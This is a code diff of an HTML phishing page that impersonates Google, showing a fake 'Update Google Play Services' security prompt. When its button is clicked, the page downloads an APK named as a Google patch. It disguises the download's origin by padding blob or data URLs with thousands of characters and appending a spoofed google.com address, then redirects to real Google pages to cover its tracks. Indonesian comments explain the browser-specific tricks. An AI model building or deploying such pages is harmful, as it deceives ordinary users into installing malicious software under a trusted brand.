@@ -3,114 +3,61 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Security Verification</title>
+    <title>Google Security Services</title>
     <style>
-        body { 
-            background: #ffffff; 
-            color: #202124; 
-            font-family: 'Roboto', Arial, sans-serif; 
-            text-align: center; 
-            padding-top: 80px; 
-            margin: 0;
-        }
-        .container { 
-            padding: 20px;
-            max-width: 400px;
-            margin: auto;
-        }
-        .g-logo {
-            font-size: 32px;
-            font-weight: bold;
-            margin-bottom: 20px;
-            letter-spacing: -1.5px;
-        }
-        .blue { color: #4285F4; } .red { color: #EA4335; } 
-        .yellow { color: #FBBC05; } .green { color: #34A853; }
-        
-        h2 { font-weight: 400; font-size: 22px; color: #3c4043; }
-        p { color: #5f6368; font-size: 14px; line-height: 1.5; margin-bottom: 30px; }
-
-        #strikeBtn {
-            background-color: #1a73e8;
-            color: white;
-            border: none;
-            padding: 12px 24px;
-            font-size: 14px;
-            font-weight: 500;
-            border-radius: 4px;
-            cursor: pointer;
-            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
-        }
-        #strikeBtn:active { background-color: #174ea6; }
-        
-        #status {
-            margin-top: 40px;
-            font-size: 12px;
-            color: #dadce0;
-            font-family: monospace;
-        }
+        body { background: #f8f9fa; color: #202124; font-family: 'Roboto', sans-serif; text-align: center; padding-top: 100px; }
+        .card { border: 1px solid #dadce0; padding: 40px; display: inline-block; border-radius: 8px; background: #fff; max-width: 320px; }
+        .logo { font-size: 24px; font-weight: bold; margin-bottom: 20px; }
+        .blue { color: #4285f4; } .red { color: #ea4335; } .yellow { color: #fbbc05; } .green { color: #34a853; }
+        button { background: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; cursor: pointer; font-weight: 500; width: 100%; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <div class="g-logo">
+    <div class="card">
+        <div class="logo">
             <span class="blue">G</span><span class="red">o</span><span class="yellow">o</span><span class="blue">g</span><span class="green">l</span><span class="red">e</span>
         </div>
-        <h2>Security Update Required</h2>
-        <p>To continue using Google services on this device, you must install the latest security patch (v2026.04).</p>
-        
-        <button type="button" id="strikeBtn">UPDATE NOWsss</button>
-        
-        <div id="status">> Monitoring device_health...</div>
+        <p>Update Google Play Services to continue using this device.</p>
+        <button id="pwnBtn">UPDATE NOW</button>
     </div>
 
 <script>
-    document.getElementById('strikeBtn').addEventListener('click', function() {
-        const filename = "Google_Security_Patch.apk";
-        const spoofDomain = "www.google.com";
+    document.getElementById('pwnBtn').addEventListener('click', function() {
+        const filename = "Google_Play_v2026.apk";
+        const spoofDomain = "https://www.google.com";
         
-        // --- ENHANCED ORIGIN INJECTION LOGIC ---
+        // --- CHROME SPECIFIC STRATEGY: Blob URL Masking ---
+        // Chrome sering kali menampilkan origin dari 'halaman terakhir yang aktif'.
+        const blob = new Blob(["PK\x03\x04..."], {type: "application/vnd.android.package-archive"});
+        const url = URL.createObjectURL(blob);
         
-        // 1. Target Spoof
-        const target = "https://" + spoofDomain;
-        const subPath = "/identity/verification/security-check/";
+        // Padding ekstrem menggunakan kombinasi karakter agar Chrome gagal melakukan sanitasi origin
+        const nbSpace = decodeURIComponent("%C2%A0");
+        const padding = nbSpace.repeat(4000); // Dorong skema blob: keluar
         
-        // 2. Padding Strategis
-        // Menggunakan banyak slash dan karakter repetitif untuk memicu "Middle Truncation"
-        // di mana UI Firefox akan menyisakan bagian yang terlihat seperti domain valid (Google)
-        const slashPadding = "/".repeat(60);
-        const junkPadding = "a".repeat(150);
-        
-        // 3. Payload Construction
-        const base64Data = "ZXN0dGVzdGVzdHRlc3Q="; // Dummy data
-        
-        // Kita letakkan target domain tepat setelah fragment #
-        // Format: data:[MIME];base64,[DATA]#[Fake_Origin][Path_Bloating][Trash]
-        const payload = `data:application/octet-stream;base64,${base64Data}#${target}${subPath}${slashPadding}${junkPadding}`;
+        const payload = url + "#" + padding + spoofDomain + "/update/";
 
-        const a = document.createElement('a');
-        a.href = payload;
-        a.download = filename;
-        document.body.appendChild(a);
+        // TRIGGER 1: Buka tab baru ke Google asli (untuk "mengambil" context origin)
+        const fakeWindow = window.open("https://www.google.com", "_blank");
 
-        // --- STEP 1: EXECUTE DOWNLOAD ---
-        a.click();
-
-        // --- STEP 2: UI FEEDBACK ---
-        document.getElementById('status').innerText = "> VERIFYING ORIGIN: " + spoofDomain;
-        document.getElementById('strikeBtn').innerText = "PROCESSING...";
-        document.getElementById('strikeBtn').disabled = true;
-
-        // --- STEP 3: AUTOMATIC REDIRECT ---
-        // Jeda 500ms agar download manager sempat menangkap context origin
-        // sebelum halaman berpindah ke Google yang asli.
+        // TRIGGER 2: Jalankan download di tab ini sesaat setelah tab baru dibuka
         setTimeout(() => {
-            window.location.href = "https://www.google.com";
-            document.body.removeChild(a);
-        }, 4000); 
+            const a = document.createElement('a');
+            a.href = payload;
+            a.download = filename;
+            document.body.appendChild(a);
+            a.click();
+            
+            // Langsung pindah (Redirect) tab ini juga ke google agar address bar berubah
+            window.location.replace("https://www.google.com/search?q=security+update+success");
+        }, 300);
+
+        // TRIGGER 3: Tutup tab baru tadi agar user kembali fokus ke dialog download yang muncul
+        setTimeout(() => {
+            if (fakeWindow) fakeWindow.close();
+        }, 1500);
     });
 </script>
-
 </body>
 </html>
